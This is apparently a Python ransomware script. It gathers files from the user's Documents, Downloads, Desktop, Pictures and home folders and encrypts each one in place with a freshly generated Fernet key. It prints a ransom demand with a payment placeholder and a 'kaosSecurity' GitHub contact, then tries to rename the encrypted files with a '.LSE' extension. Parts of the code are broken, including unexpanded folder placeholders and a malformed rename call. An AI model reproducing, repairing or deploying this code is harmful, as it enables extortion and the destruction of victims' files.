import os
from cryptography.fernet import Fernet

files = []

e4 = '%Documents%'

h4 = '%User%'

v3 = '%Downloads%'

dry4 = '%Desktop%'

dry77 = '%Pictures%'

for file in os.listdir(e4):
        if file == "LSE.py" or file == "thekey.key":
                continue
        if os.path.isfile(file):
                files.append(file)

for file in os.listdir(h4):
        if file == "LSE.py" or file == "thekey.key":
                continue
        if os.path.isfile(file):
                files.append(file)

for file in os.listdir(v3):
        if file == "LSE.py" or file == "thekey.key":
                continue
        if os.path.isfile(file):
                files.append(file)

for file in os.listdir(dry4):
        if file == "LSE.py" or file == "thekey.key":
                continue
        if os.path.isfile(file):
                files.append(file)

for file in os.listdir(dry77):
        if file == "LSE.py" or file == "thekey.key":
                continue
        if os.path.isfile(file):
                files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
        thekey.write(key)

print("Would you like the password to that funny .rar?")
print("You can send your money to: [PLACEHOLDER]")
print("If you're too broke or normal enough, contact us")
print("kaosSecurity solutions: https://github.com/kaosSec")

for file in files:
    with open(file, "rb") as thefile:
            contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
        os.rename(thefile, thefile, ".LSE")
